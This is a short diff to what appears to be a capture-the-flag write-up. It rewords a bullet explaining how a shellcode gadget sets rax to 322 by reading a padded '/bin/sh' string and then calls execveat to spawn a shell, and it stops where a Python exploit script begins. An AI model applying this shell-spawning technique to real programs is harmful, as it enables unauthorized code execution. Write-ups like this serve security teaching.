@@ -15,7 +15,7 @@ syscall
 jne    0xfffffffffffffffc
 ```
 * First time read the `/bin/sh\x00` with padding to let length of it become 322 to the stack.
-* After `jne` it continue at `xor edx,esp` with `rax = 322` , `rdx = edx ^ esp ^ esp = 0` , `rsi = /bin/sh`.
+* After `jne` it continue at `xor edx,esp` with `rax = 322` , `rsi = /bin/sh` and cause `rdx = edx ^ esp ^ esp = 0`.
 * Syscall again -> execveat( 0 , "/bin/sh" , 0 , 0 ).
 ```python
 #!/usr/bin/env python
